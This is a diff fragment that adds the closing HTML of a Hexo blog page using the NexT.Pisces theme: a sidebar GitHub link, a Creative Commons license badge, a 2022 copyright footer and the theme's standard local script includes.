+        <a href="https://github.com/polishing-labs" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;polishing-labs" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-CN" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">楼上请让路*</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://pisces.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
